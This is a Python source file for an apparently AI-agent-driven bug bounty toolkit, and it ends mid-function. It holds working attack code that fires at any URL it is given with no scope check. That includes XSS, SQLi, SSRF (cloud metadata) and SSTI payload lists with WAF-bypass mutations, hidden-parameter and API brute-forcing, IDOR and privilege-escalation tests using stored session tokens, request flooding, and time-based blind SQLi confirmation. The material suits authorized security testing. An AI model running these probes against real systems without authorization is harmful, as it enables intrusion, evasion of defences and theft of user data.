"""
BB Engines — Advanced Bug Bounty Hunting Engines for Ultimate AI Agent
=======================================================================
12 specialized engines:
  1.  PassiveReconEngine      — Wayback, JS extraction, subdomain enum
  2.  ParameterDiscovery      — URL param mining, endpoint fuzzing, GraphQL detection
  3.  PayloadMutationEngine   — WAF bypass, encoding, case mutation, param pollution
  4.  AuthSessionEngine       — Cookie/token session management for auth testing
  5.  ExploitConfirmEngine    — False positive filtering, response diffing, evidence capture
  6.  AIImpactAnalyzer        — LLM-powered severity scoring and impact writeup
  7.  DuplicateFinder         — HackerOne disclosed report search + bounty estimation
  8.  TakeoverEngine          — CNAME dangling record + provider fingerprint takeover
  9.  ShodanEngine            — Free InternetDB: ports, CVEs, CPEs (no API key)
  10. AsyncReconEngine        — BufferOver, RapidDNS, URLScan.io subdomain sources
  11. JWTScanner              — JWT alg:none, weak HS256, RS256→HS256 confusion
  12. CVSS31Calculator        — CVSS 3.1 vector string calculator + score
  + Helpers: CRLFProbe, PrototypePollutionProbe, BlindXSSEngine,
             GitHubReconEngine, WebhookNotifier
"""

import os, re, json, time, hashlib, logging, random, string
from typing import Dict, List, Optional, Tuple, Any
from urllib.parse import urlparse, urlencode, parse_qs, urljoin, quote
from datetime import datetime

try:
    import requests
    REQUESTS_OK = True
except ImportError:
    REQUESTS_OK = False

try:
    from curl_cffi import requests as curl_requests
    CURL_CFFI_OK = True
except ImportError:
    CURL_CFFI_OK = False

logger = logging.getLogger("BBEngines")

DEFAULT_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
DEFAULT_HEADERS = {
    "User-Agent": DEFAULT_UA,
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Upgrade-Insecure-Requests": "1",
    "X-Bug-Bounty": "yuvaraj030_agent",
    "X-Test-Account-Email": "test_yuvaraj030@example.com"
}


def _get(url, timeout=10, headers=None, allow_redirects=True, session=None):
    """GET wrapper: curl_cffi (Chrome TLS) preferred, falls back to requests."""
    h = {**DEFAULT_HEADERS, **(headers or {})}
    try:
        if session:
            return session.get(url, headers=h, timeout=timeout, allow_redirects=allow_redirects)
        if CURL_CFFI_OK:
            return curl_requests.get(url, headers=h, timeout=timeout,
                                     allow_redirects=allow_redirects,
                                     impersonate="chrome110")
        elif REQUESTS_OK:
            return requests.get(url, headers=h, timeout=timeout, allow_redirects=allow_redirects)
        return None
    except Exception as e:
        logger.debug(f"GET {url}: {e}")
        return None


def _post(url, data=None, json_data=None, headers=None, timeout=12, session=None):
    """POST wrapper: curl_cffi (Chrome TLS) preferred, falls back to requests."""
    h = {**DEFAULT_HEADERS, **(headers or {})}
    try:
        if session:
            return session.post(url, data=data, json=json_data, headers=h, timeout=timeout)
        if CURL_CFFI_OK:
            return curl_requests.post(url, data=data, json=json_data, headers=h,
                                      timeout=timeout, impersonate="chrome110")
        elif REQUESTS_OK:
            return requests.post(url, data=data, json=json_data, headers=h, timeout=timeout)
        return None
    except Exception as e:
        logger.debug(f"POST {url}: {e}")
        return None


# ══════════════════════════════════════════════════════════════════════════════
# 1. PASSIVE RECON ENGINE
# ══════════════════════════════════════════════════════════════════════════════

class PassiveReconEngine:
    """
    Advanced passive recon: Wayback archive, JS endpoint extraction,
    AlienVault OTX, HackerTarget, DNS records.
    """

    def wayback_urls(self, domain: str, limit: int = 100) -> List[str]:
        """Pull all archived URLs from Wayback CDX API."""
        url = (f"https://web.archive.org/cdx/search/cdx"
               f"?url=*.{domain}/*&output=text&fl=original&collapse=urlkey&limit={limit}")
        resp = _get(url, timeout=25)
        if not resp or resp.status_code != 200:
            return []
        urls = list(set(resp.text.strip().splitlines()))
        return [u for u in urls if u.startswith("http")][:limit]

    def extract_js_endpoints(self, js_url: str) -> List[str]:
        """Extract API endpoints, paths and params from a JS file."""
        resp = _get(js_url, timeout=15)
        if not resp or resp.status_code != 200:
            return []
        text = resp.text
        endpoints = set()
        # Match /api/v1/xyz style paths
        for m in re.finditer(r'["\'](/(?:api|v\d|graphql|rest|internal)[^"\'<>\s]{2,100})["\']', text):
            endpoints.add(m.group(1))
        # Match full https:// URLs
        for m in re.finditer(r'https?://[^\s"\'<>]{10,150}', text):
            endpoints.add(m.group(0))
        # Match fetch/axios/XHR call paths
        for m in re.finditer(r'(?:fetch|axios\.(?:get|post|put|delete))\(["\']([^"\']+)["\']', text):
            endpoints.add(m.group(1))
        return sorted(endpoints)[:80]

    def find_js_files(self, base_url: str) -> List[str]:
        """Find JS files linked in a page."""
        resp = _get(base_url, timeout=12)
        if not resp or resp.status_code != 200:
            return []
        parsed = urlparse(base_url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        js_files = []
        for m in re.finditer(r'src=["\']([^"\']+\.js(?:\?[^"\']*)?)["\']', resp.text, re.I):
            src = m.group(1)
            if src.startswith("http"):
                js_files.append(src)
            elif src.startswith("//"):
                js_files.append("https:" + src)
            elif src.startswith("/"):
                js_files.append(base + src)
            else:
                js_files.append(urljoin(base_url, src))
        return list(set(js_files))[:20]

    def haktrails_subdomains(self, domain: str) -> List[str]:
        """Get subdomains from HackerTarget (free, no auth)."""
        url = f"https://api.hackertarget.com/hostsearch/?q={domain}"
        resp = _get(url, timeout=15)
        if not resp or resp.status_code != 200:
            return []
        subs = []
        for line in resp.text.strip().splitlines():
            parts = line.split(",")
            if parts and parts[0].endswith(domain):
                subs.append(parts[0].strip())
        return subs[:50]

    def otx_subdomains(self, domain: str) -> List[str]:
        """Get subdomains from AlienVault OTX (no auth)."""
        url = f"https://otx.alienvault.com/api/v1/indicators/domain/{domain}/passive_dns"
        resp = _get(url, timeout=15)
        if not resp or resp.status_code != 200:
            return []
        try:
            data = resp.json().get("passive_dns", [])
            subs = set()
            for record in data:
                hostname = record.get("hostname", "")
                if hostname.endswith(domain) and hostname != domain:
                    subs.add(hostname.lower())
            return sorted(subs)[:50]
        except Exception:
            return []

    def wayback_params(self, domain: str) -> Dict[str, List[str]]:
        """Extract unique parameters from Wayback archived URLs."""
        urls = self.wayback_urls(domain, limit=200)
        param_map: Dict[str, List[str]] = {}
        for url in urls:
            try:
                parsed = urlparse(url)
                params = parse_qs(parsed.query)
                path = parsed.path or "/"
                if params:
                    if path not in param_map:
                        param_map[path] = []
                    for k in params:
                        if k not in param_map[path]:
                            param_map[path].append(k)
            except Exception:
                pass
        return param_map

    def graphql_detect(self, base_url: str) -> Optional[Dict]:
        """Detect GraphQL endpoint and check for introspection."""
        common_endpoints = [
            "/graphql", "/api/graphql", "/graphql/v1",
            "/v1/graphql", "/gql", "/query", "/api/query",
        ]
        parsed = urlparse(base_url if base_url.startswith("http") else "https://" + base_url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        introspection_query = {"query": "{ __schema { types { name } } }"}

        for ep in common_endpoints:
            url = base + ep
            resp = _post(url, json_data=introspection_query,
                         headers={"Content-Type": "application/json"}, timeout=8)
            if resp and resp.status_code == 200:
                try:
                    data = resp.json()
                    if "__schema" in str(data):
                        types = data.get("data", {}).get("__schema", {}).get("types", [])
                        names = [t["name"] for t in types if not t["name"].startswith("__")][:15]
                        return {
                            "found": True,
                            "endpoint": url,
                            "introspection_enabled": True,
                            "types": names,
                            "severity": "MEDIUM",
                            "message": f"GraphQL introspection enabled at {url}",
                        }
                    elif "data" in data or "errors" in data:
                        return {
                            "found": True,
                            "endpoint": url,
                            "introspection_enabled": False,
                            "message": f"GraphQL endpoint found at {url} (introspection disabled)",
                            "severity": "INFO",
                        }
                except Exception:
                    pass
        return None

    def full_recon(self, domain: str) -> str:
        """Run full passive recon suite."""
        import re
        domain = re.sub(r'^https?://', '', domain.strip()).split("/")[0]
        lines = [f"🕵️  Deep Passive Recon: {domain}", "═" * 60]

        # 1. Subdomains — crt.sh
        from bug_bounty_hunter import _recon_crtsh
        crt_subs = _recon_crtsh(domain)
        # Subdomains — HackerTarget
        ht_subs = self.haktrails_subdomains(domain)
        # Subdomains — OTX
        otx_subs = self.otx_subdomains(domain)
        all_subs = sorted(set(crt_subs + ht_subs + otx_subs))

        lines.append(f"\n  📜 Subdomains Found: {len(all_subs)}")
        lines.append(f"     Sources: crt.sh({len(crt_subs)}) HackerTarget({len(ht_subs)}) OTX({len(otx_subs)})")
        for sub in all_subs[:25]:
            lines.append(f"    • {sub}")
        if len(all_subs) > 25:
            lines.append(f"    ... and {len(all_subs) - 25} more")

        # 2. JS files + endpoint extraction
        base_url = f"https://{domain}"
        lines.append(f"\n  📦 JavaScript File Analysis:")
        js_files = self.find_js_files(base_url)
        lines.append(f"    Found {len(js_files)} JS file(s)")
        all_endpoints = []
        for jsf in js_files[:5]:
            eps = self.extract_js_endpoints(jsf)
            all_endpoints.extend(eps)
            if eps:
                lines.append(f"    • {jsf.split('/')[-1][:50]} → {len(eps)} endpoints")
        all_endpoints = list(set(all_endpoints))
        if all_endpoints:
            lines.append(f"\n    Extracted {len(all_endpoints)} unique endpoint(s):")
            for ep in all_endpoints[:15]:
                lines.append(f"      → {ep[:80]}")

        # 3. Wayback parameter mining
        lines.append(f"\n  🕰️  Wayback Parameter Mining:")
        param_map = self.wayback_params(domain)
        total_params = sum(len(v) for v in param_map.values())
        lines.append(f"    Found {total_params} unique params across {len(param_map)} paths")
        for path, params in list(param_map.items())[:8]:
            lines.append(f"    • {path}: {', '.join(params[:6])}")

        # 4. GraphQL detection
        lines.append(f"\n  🔷 GraphQL Detection:")
        gql = self.graphql_detect(domain)
        if gql and gql.get("found"):
            icon = "🟠" if gql.get("introspection_enabled") else "🟢"
            lines.append(f"    {icon} {gql['message']}")
            if gql.get("types"):
                lines.append(f"       Types: {', '.join(gql['types'][:8])}")
        else:
            lines.append("    ✅ No exposed GraphQL endpoint found")

        lines.append(f"\n{'═' * 60}")
        lines.append(f"  ➜ Run /bugbounty params {domain} to mine parameters")
        lines.append(f"  ➜ Run /bugbounty scan <url> for active scanning")
        return "\n".join(lines)


# ══════════════════════════════════════════════════════════════════════════════
# 2. PARAMETER DISCOVERY ENGINE
# ══════════════════════════════════════════════════════════════════════════════

class ParameterDiscovery:
    """Discover hidden parameters and API endpoints."""

    # Common parameters worth testing
    COMMON_PARAMS = [
        "id", "user", "uid", "userid", "user_id", "account", "account_id",
        "order", "order_id", "file", "filename", "path", "page", "action",
        "q", "query", "search", "s", "redirect", "url", "next", "return",
        "callback", "token", "key", "api_key", "format", "type", "debug",
        "admin", "role", "sort", "limit", "offset", "from", "to", "email",
        "username", "password", "lang", "language", "ref", "referrer",
        "source", "ip", "host", "domain", "data", "payload", "input",
        "json", "xml", "output", "mode", "view", "template",
    ]

    # Common API prefixes to brute-force
    API_PATHS = [
        "/api/v1/", "/api/v2/", "/api/v3/", "/api/",
        "/v1/", "/v2/", "/rest/", "/graphql", "/rpc",
        "/internal/", "/private/", "/admin/api/",
    ]

    # Common endpoints to check under API paths
    API_ENDPOINTS = [
        "users", "user", "accounts", "account", "profile", "me",
        "admin", "settings", "config", "debug", "health", "status",
        "orders", "payments", "invoices", "files", "upload",
        "keys", "tokens", "secrets", "logs", "audit",
    ]

    def discover_from_wayback(self, domain: str) -> Dict[str, List[str]]:
        """Use Wayback Machine to find parameters and endpoints."""
        engine = PassiveReconEngine()
        return engine.wayback_params(domain)

    def fuzz_parameters(self, url: str, method: str = "GET",
                        session=None) -> List[Dict]:
        """Test common hidden parameters on an endpoint."""
        findings = []
        base = url.split("?")[0]
        # Get baseline response
        baseline = _get(base, session=session)
        if not baseline:
            return findings

        baseline_len = len(baseline.content)
        baseline_status = baseline.status_code

        for param in self.COMMON_PARAMS[:30]:
            test_url = f"{base}?{param}=1"
            resp = _get(test_url, timeout=6, session=session)
            if not resp:
                continue
            # Interesting if: status changed, content length significantly different
            len_diff = abs(len(resp.content) - baseline_len)
            status_changed = resp.status_code != baseline_status
            if status_changed or len_diff > 200:
                findings.append({
                    "param": param,
                    "url": test_url,
                    "baseline_status": baseline_status,
                    "new_status": resp.status_code,
                    "len_diff": len_diff,
                    "interesting": True,
                    "message": f"Parameter '{param}' changes response (status:{baseline_status}→{resp.status_code}, diff:{len_diff}b)",
                })
        return findings

    def enumerate_api_endpoints(self, base_url: str, session=None) -> List[Dict]:
        """Discover API endpoints by brute-forcing common paths."""
        if not base_url.startswith("http"):
            base_url = "https://" + base_url
        parsed = urlparse(base_url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        found = []

        for api_prefix in self.API_PATHS:
            for endpoint in self.API_ENDPOINTS:
                url = origin + api_prefix + endpoint
                resp = _get(url, timeout=6, session=session, allow_redirects=False)
                if resp and resp.status_code not in [404, 400]:
                    found.append({
                        "url": url,
                        "status": resp.status_code,
                        "size": len(resp.content),
                        "content_type": resp.headers.get("Content-Type", ""),
                        "message": f"[{resp.status_code}] {url}",
                        "severity": "MEDIUM" if resp.status_code == 200 else "LOW",
                    })
        return found

    def run(self, target: str) -> str:
        """Full parameter discovery run."""
        if target.startswith("http"):
            parsed = urlparse(target)
            domain = parsed.netloc
        else:
            domain = target.split("/")[0]

        lines = [f"🔎 Parameter Discovery: {target}", "═" * 60]

        # Wayback params
        lines.append("\n  🕰️  Wayback Parameter Mining:")
        param_map = self.discover_from_wayback(domain)
        total = sum(len(v) for v in param_map.values())
        lines.append(f"    Found {total} unique params across {len(param_map)} paths")
        interesting = {p: v for p, v in param_map.items()
                       if any(kw in " ".join(v).lower() for kw in
                              ["id", "user", "admin", "token", "file", "redirect"])}
        for path, params in list(interesting.items())[:6]:
            lines.append(f"    🟡 {path}: {', '.join(params)}")

        # Parameter fuzzing
        if target.startswith("http"):
            lines.append(f"\n  🧪 Parameter Fuzzing: {target}")
            fuzz = self.fuzz_parameters(target)
            if fuzz:
                for f in fuzz[:10]:
                    lines.append(f"    🟡 Interesting param: '{f['param']}' → {f['message'][:80]}")
            else:
                lines.append("    ✅ No hidden parameters found via fuzzing")

        # API enumeration
        lines.append(f"\n  🗺️  API Endpoint Enumeration:")
        apis = self.enumerate_api_endpoints(target)
        if apis:
            lines.append(f"    Found {len(apis)} accessible endpoint(s):")
            for a in apis[:15]:
                icon = "🔴" if a["status"] == 200 else "🟡"
                lines.append(f"    {icon} [{a['status']}] {a['url']}")
        else:
            lines.append("    ✅ No unexpected API endpoints found")

        lines.append(f"\n{'═' * 60}")
        return "\n".join(lines)


# ══════════════════════════════════════════════════════════════════════════════
# 3. PAYLOAD MUTATION ENGINE
# ══════════════════════════════════════════════════════════════════════════════

class PayloadMutationEngine:
    """
    Smart payload mutation: WAF bypass encoding, case mutation,
    parameter pollution, Unicode tricks, double encoding.
    """

    BASE_XSS = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "javascript:alert(1)",
        "'><script>alert(1)</script>",
        "<details open ontoggle=alert(1)>",
    ]

    BASE_SQLI = [
        "'",
        "1'--",
        "1' OR '1'='1'--",
        "1 UNION SELECT NULL--",
        "' OR 1=1--",
        "admin'--",
    ]

    BASE_SSRF = [
        "http://127.0.0.1",
        "http://localhost",
        "http://169.254.169.254",          # AWS metadata
        "http://metadata.google.internal",  # GCP metadata
        "http://[::1]",
    ]

    BASE_SSTI = [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
        "*{7*7}",
        "{{config}}",
    ]

    def _encode_html(self, payload: str) -> str:
        return "".join(f"&#{ord(c)};" for c in payload)

    def _encode_url(self, payload: str) -> str:
        return quote(payload, safe="")

    def _encode_double_url(self, payload: str) -> str:
        return quote(quote(payload, safe=""), safe="")

    def _encode_unicode(self, payload: str) -> str:
        return "".join(f"\\u{ord(c):04x}" for c in payload[:20])

    def _case_mix(self, payload: str) -> str:
        return "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(payload))

    def _waf_bypass_xss(self, base: str) -> List[str]:
        """Generate WAF-bypass XSS variants."""
        variants = [base]
        variants.append(base.replace("script", "SCRIPT"))
        variants.append(base.replace("script", "sCrIpT"))
        variants.append(base.replace("<script>", "<script\t>"))
        variants.append(base.replace("<script>", "<script\n>"))
        variants.append(base.replace("alert", "alert\t"))
        variants.append(base.replace("alert(1)", "confirm(1)"))
        variants.append(base.replace("alert(1)", "prompt(1)"))
        # HTML entity encoding the payload
        variants.append(self._encode_html(base[:20]))
        # Null byte injection
        variants.append(base.replace("<script>", "<scr\x00ipt>"))
        return variants

    def _waf_bypass_sqli(self, base: str) -> List[str]:
        """Generate WAF-bypass SQLi variants."""
        variants = [base]
        variants.append(base.replace(" ", "/**/"))
        variants.append(base.replace(" ", "\t"))
        variants.append(base.replace(" ", "%20"))
        variants.append(base.replace("OR", "||"))
        variants.append(base.replace("AND", "&&"))
        variants.append(base.replace("SELECT", "SEL/**/ECT"))
        variants.append(base.replace("UNION", "UN/**/ION"))
        variants.append(base.upper())
        variants.append(base.replace("--", "#"))
        return variants

    def _parameter_pollution(self, param: str, payload: str) -> List[Dict]:
        """Generate HTTP Parameter Pollution variants."""
        return [
            {"params": f"{param}=safe&{param}={quote(payload)}", "technique": "HPP duplicate"},
            {"params": f"{param}[]=safe&{param}[]={quote(payload)}", "technique": "Array param"},
            {"params": f"{param}=safe%26{param}={quote(payload)}", "technique": "Encoded ampersand"},
        ]

    def mutate_xss(self, count: int = 12) -> List[Dict]:
        """Generate XSS payload mutations."""
        results = []
        for base in self.BASE_XSS:
            for variant in self._waf_bypass_xss(base)[:2]:
                results.append({
                    "payload": variant,
                    "encoded_url": self._encode_url(variant),
                    "technique": "xss_waf_bypass",
                    "type": "XSS",
                })
                if len(results) >= count:
                    break
        return results[:count]

    def mutate_sqli(self, count: int = 12) -> List[Dict]:
        """Generate SQLi payload mutations."""
        results = []
        for base in self.BASE_SQLI:
            for variant in self._waf_bypass_sqli(base)[:2]:
                results.append({
                    "payload": variant,
                    "encoded_url": self._encode_url(variant),
                    "technique": "sqli_waf_bypass",
                    "type": "SQLi",
                })
                if len(results) >= count:
                    break
        return results[:count]

    def mutate_ssrf(self) -> List[Dict]:
        """Generate SSRF payloads with bypass encodings."""
        results = []
        for base in self.BASE_SSRF:
            results.append({"payload": base, "type": "SSRF", "technique": "direct"})
            # IP encoding bypasses
            if "127.0.0.1" in base:
                for variant in ["http://2130706433", "http://0x7f000001",
                                 "http://127.1", "http://0177.0.0.1"]:
                    results.append({"payload": variant, "type": "SSRF", "technique": "ip_encoding"})
        return results

    def mutate_ssti(self) -> List[Dict]:
        """Generate SSTI detection payloads."""
        return [
            {"payload": p, "type": "SSTI",
             "detection": "Look for '49' in response (7*7=49)"}
            for p in self.BASE_SSTI
        ]

    def probe_with_mutations(self, url: str, param: str,
                             vuln_type: str = "xss", session=None) -> List[Dict]:
        """
        Fire mutated payloads at a parameter and collect confirmed hits.
        Returns only confirmed (response reflects/errors) findings.
        """
        hits = []
        base_url = url.split("?")[0]

        if vuln_type == "xss":
            payloads = self.mutate_xss(count=8)
        elif vuln_type == "sqli":
            payloads = self.mutate_sqli(count=8)
        elif vuln_type == "ssti":
            payloads = self.mutate_ssti()
        else:
            payloads = self.mutate_xss(count=4) + self.mutate_sqli(count=4)

        baseline_resp = _get(f"{base_url}?{param}=SAFE_BASELINE", session=session, timeout=6)
        baseline_body = (baseline_resp.text or "") if baseline_resp else ""

        for p in payloads:
            test_url = f"{base_url}?{urlencode({param: p['payload']})}"
            resp = _get(test_url, session=session, timeout=8)
            if not resp:
                continue
            body = resp.text or ""
            confirmed = False
            evidence = ""

            if vuln_type == "xss" and p["payload"][:20] in body:
                confirmed = True
                evidence = f"Payload reflected verbatim in response"
            elif vuln_type == "sqli":
                for err in ["SQL syntax", "ORA-", "mysql_fetch", "SQLSTATE", "syntax error",
                            "Unclosed quotation", "Warning: mysql", "pg_query"]:
                    if err.lower() in body.lower() and err.lower() not in baseline_body.lower():
                        confirmed = True
                        evidence = f"SQL error string detected: '{err}'"
                        break
            elif vuln_type == "ssti" and "49" in body and "49" not in baseline_body:
                confirmed = True
                evidence = "Template expression evaluated: 7*7=49 found in response"

            if confirmed:
                hits.append({
                    "url": test_url,
                    "param": param,
                    "payload": p["payload"],
                    "technique": p.get("technique", ""),
                    "type": vuln_type.upper(),
                    "confirmed": True,
                    "evidence": evidence,
                    "severity": "HIGH" if vuln_type in ["xss", "sqli"] else "CRITICAL",
                })
        return hits

    def show_payloads(self, vuln_type: str = "xss") -> str:
        """Display available mutated payloads for a vuln type."""
        lines = [f"💊 Mutated Payloads — {vuln_type.upper()}", "═" * 55]
        if vuln_type == "xss":
            payloads = self.mutate_xss()
        elif vuln_type == "sqli":
            payloads = self.mutate_sqli()
        elif vuln_type == "ssrf":
            payloads = self.mutate_ssrf()
        elif vuln_type == "ssti":
            payloads = self.mutate_ssti()
        else:
            lines.append("Types: xss | sqli | ssrf | ssti")
            return "\n".join(lines)
        for i, p in enumerate(payloads, 1):
            lines.append(f"  [{i:02d}] [{p.get('technique','direct')}]")
            lines.append(f"       Raw: {p['payload'][:80]}")
            if p.get("encoded_url"):
                lines.append(f"       URL: {p['encoded_url'][:80]}")
        return "\n".join(lines)


# ══════════════════════════════════════════════════════════════════════════════
# 4. AUTH SESSION ENGINE
# ══════════════════════════════════════════════════════════════════════════════

class AuthSessionEngine:
    """
    Manage authenticated sessions for testing auth-protected endpoints.
    Supports: cookie-based, Bearer token, Basic auth, custom headers.
    Tests: IDOR, privilege escalation, broken access control.
    """

    SESSIONS_FILE = "bb_sessions.json"

    def __init__(self):
        self.sessions: Dict[str, Dict] = {}
        self._load_sessions()
        self._active: Optional[str] = None

    def _load_sessions(self):
        if os.path.exists(self.SESSIONS_FILE):
            try:
                self.sessions = json.load(open(self.SESSIONS_FILE))
            except Exception:
                self.sessions = {}

    def _save_sessions(self):
        try:
            json.dump(self.sessions, open(self.SESSIONS_FILE, "w"), indent=2)
        except Exception:
            pass

    def add_session(self, name: str, auth_type: str, value: str,
                    extra_headers: Dict = None) -> str:
        """Register a named session."""
        self.sessions[name] = {
            "name": name,
            "auth_type": auth_type,  # cookie | bearer | basic | header
            "value": value,
            "extra_headers": extra_headers or {},
            "added": datetime.now().isoformat(),
        }
        self._save_sessions()
        self._active = name
        return f"✅ Session '{name}' saved ({auth_type})"

    def get_session_headers(self, name: Optional[str] = None) -> Dict:
        """Return auth headers for a session."""
        name = name or self._active
        if not name or name not in self.sessions:
            return {}
        s = self.sessions[name]
        headers = dict(s.get("extra_headers", {}))
        if s["auth_type"] == "bearer":
            headers["Authorization"] = f"Bearer {s['value']}"
        elif s["auth_type"] == "basic":
            import base64
            encoded = base64.b64encode(s["value"].encode()).decode()
            headers["Authorization"] = f"Basic {encoded}"
        elif s["auth_type"] == "cookie":
            headers["Cookie"] = s["value"]
        elif s["auth_type"] == "header":
            # value is "HeaderName: HeaderValue"
            if ":" in s["value"]:
                k, v = s["value"].split(":", 1)
                headers[k.strip()] = v.strip()
        return headers

    def make_session(self, name: Optional[str] = None) -> Optional[requests.Session]:
        """Create a requests.Session with auth configured."""
        if not REQUESTS_OK:
            return None
        headers = self.get_session_headers(name)
        if not headers:
            return None
        sess = requests.Session()
        sess.headers.update({**DEFAULT_HEADERS, **headers})
        return sess

    def test_idor(self, url_template: str, ids: List[Any],
                  name: Optional[str] = None) -> str:
        """
        Test for IDOR by iterating over IDs in a URL template.
        url_template: URL with {id} placeholder e.g. https://api.site.com/users/{id}
        ids: list of IDs to test e.g. [1, 2, 3, 100, 999]
        """
        sess = self.make_session(name)
        lines = [f"🔐 IDOR Test: {url_template}", f"   IDs: {ids}", "─" * 55]
        findings = []

        baseline_url = url_template.replace("{id}", str(ids[0]))
        baseline = _get(baseline_url, session=sess, timeout=8)
        if not baseline:
            return "  ❌ Baseline request failed — check URL and session"

        baseline_status = baseline.status_code
        baseline_body_len = len(baseline.content)

        for id_val in ids[1:]:
            url = url_template.replace("{id}", str(id_val))
            resp = _get(url, session=sess, timeout=8)
            if not resp:
                continue
            if resp.status_code == 200 and resp.status_code == baseline_status:
                len_diff = abs(len(resp.content) - baseline_body_len)
                findings.append({
                    "id": id_val,
                    "url": url,
                    "status": resp.status_code,
                    "size": len(resp.content),
                    "severity": "HIGH",
                    "message": f"IDOR: ID {id_val} accessible (size: {len(resp.content)}b, diff: {len_diff}b)",
                })
                lines.append(f"  🟠 [HIGH] ID {id_val} accessible → {resp.status_code} ({len(resp.content)}b)")
            elif resp.status_code == 403:
                lines.append(f"  ✅ ID {id_val} properly forbidden (403)")
            else:
                lines.append(f"  ℹ️  ID {id_val} → {resp.status_code}")

        if not findings:
            lines.append("\n  ✅ No IDOR found — server properly restricts access")
        else:
            lines.append(f"\n  🚨 {len(findings)} possible IDOR(s) found!")
            lines.append(f"  ➜ /bugbounty add <url> high 'IDOR: {url_template}'")
        return "\n".join(lines)

    def test_privilege_escalation(self, low_priv_url: str, high_priv_url: str,
                                  low_session: str, high_session: str) -> str:
        """Test if a low-priv session can access a high-priv endpoint."""
        low_headers = self.get_session_headers(low_session)
        high_headers = self.get_session_headers(high_session)

        lines = [f"🔓 Privilege Escalation Test", "─" * 55,
                 f"  Low-priv  access: {low_priv_url}",
                 f"  High-priv target: {high_priv_url}"]

        # Confirm high-priv session can access
        resp_high = _get(high_priv_url, headers=high_headers, timeout=8)
        if not resp_high or resp_high.status_code != 200:
            lines.append(f"  ⚠️ High-priv endpoint returned {getattr(resp_high,'status_code','timeout')} — verify URL")
            return "\n".join(lines)

        # Test low-priv session on high-priv endpoint
        resp_low = _get(high_priv_url, headers=low_headers, timeout=8)
        if resp_low and resp_low.status_code == 200:
            lines.append(f"  🔴 [CRITICAL] LOW-PRIV SESSION ACCESSED HIGH-PRIV ENDPOINT!")
            lines.append(f"     Status: {resp_low.status_code} | Size: {len(resp_low.content)}b")
            lines.append(f"     ➜ BROKEN ACCESS CONTROL — submit this immediately!")
        elif resp_low and resp_low.status_code == 403:
            lines.append(f"  ✅ Access properly denied (403 Forbidden)")
        elif resp_low and resp_low.status_code == 401:
            lines.append(f"  ✅ Auth required (401 Unauthorized)")
        else:
            lines.append(f"  ℹ️  Response: {getattr(resp_low,'status_code','timeout')}")
        return "\n".join(lines)

    def test_rate_limit(self, url: str, requests_count: int = 50,
                        name: Optional[str] = None) -> str:
        """Test for rate limiting (or lack thereof)."""
        sess = self.make_session(name)
        lines = [f"⚡ Rate Limit Test: {url}", f"   Sending {requests_count} requests...", "─" * 40]
        statuses = []
        start = time.time()
        for i in range(min(requests_count, 100)):
            resp = _get(url, session=sess, timeout=5)
            if resp:
                statuses.append(resp.status_code)
            else:
                statuses.append(0)
        elapsed = time.time() - start
        rate_limited = any(s in [429, 503] for s in statuses)
        all_200 = all(s == 200 for s in statuses if s > 0)
        lines.append(f"  Requests: {len(statuses)} | Time: {elapsed:.1f}s | Rate: {len(statuses)/elapsed:.1f} req/s")
        lines.append(f"  Status codes: {dict((s, statuses.count(s)) for s in set(statuses))}")
        if rate_limited:
            lines.append(f"  ✅ Rate limiting detected (got 429/503)")
        elif all_200:
            lines.append(f"  🟠 [MEDIUM] No rate limiting — all {len(statuses)} requests returned 200")
            lines.append(f"     ➜ Report as 'Missing Rate Limiting on {url}'")
        return "\n".join(lines)

    def list_sessions(self) -> str:
        if not self.sessions:
            return "  No sessions. Use /bugbounty session add <name> <type> <value>"
        lines = [f"🔐 Saved Sessions ({len(self.sessions)}):"]
        for name, s in self.sessions.items():
            active = " ← active" if name == self._active else ""
            lines.append(f"  • {name} [{s['auth_type']}]{active}")
        return "\n".join(lines)


# ══════════════════════════════════════════════════════════════════════════════
# 5. EXPLOIT CONFIRMATION ENGINE
# ══════════════════════════════════════════════════════════════════════════════

class ExploitConfirmEngine:
    """
    Eliminate false positives through response diffing, canary tokens,
    and evidence capture.
    """

    def _diff_responses(self, r1_body: str, r2_body: str) -> Dict:
        """Compare two responses and return diff stats."""
        len1, len2 = len(r1_body), len(r2_body)
        diff = abs(len1 - len2)
        ratio = diff / max(len1, len2, 1)
        # Find unique lines
        lines1 = set(r1_body.splitlines())
        lines2 = set(r2_body.splitlines())
        added = lines2 - lines1
        removed = lines1 - lines2
        return {
            "len1": len1, "len2": len2,
            "diff_bytes": diff,
            "diff_ratio": round(ratio, 3),
            "lines_added": len(added),
            "lines_removed": len(removed),
            "added_sample": list(added)[:3],
        }

    def confirm_xss(self, url: str, param: str,
                    session=None) -> Dict:
        """Confirm XSS with unique canary tokens."""
        canary = "XSSCANARY" + "".join(random.choices(string.ascii_uppercase, k=6))
        test_payload = f"<script>alert('{canary}')</script>"
        test_url = f"{url.split('?')[0]}?{urlencode({param: test_payload})}"
        resp = _get(test_url, session=session, timeout=8)
        if not resp:
            return {"confirmed": False, "reason": "Request failed"}
        if canary in (resp.text or ""):
            return {
                "confirmed": True,
                "severity": "HIGH",
                "canary": canary,
                "url": test_url,
                "evidence": f"Canary '{canary}' reflected verbatim in response at character position {resp.text.index(canary)}",
                "raw_snippet": resp.text[max(0, resp.text.index(canary)-50):resp.text.index(canary)+100],
            }
        return {"confirmed": False, "reason": "Canary not reflected"}

    def confirm_sqli(self, url: str, param: str, session=None) -> Dict:
        """Confirm SQLi via time-based blind injection."""
        base = url.split("?")[0]
        # Time-based: MySQL SLEEP(3), MSSQL WAITFOR DELAY, Postgres pg_sleep(3)
        sleep_payloads = [
            ("1' AND SLEEP(3)--", "MySQL"),
            ("1; WAITFOR DELAY '0:0:3'--", "MSSQL"),
            ("1' AND pg_sleep(3)--", "PostgreSQL"),
        ]
        for payload, db_type in sleep_payloads:
            test_url = f"{base}?{urlencode({param: payload})}"
            start = time.time()
            resp = _get(test_url, session=session, timeout=10)
            elapsed = time.time() - start
            if elapsed >= 2.5:
                return {
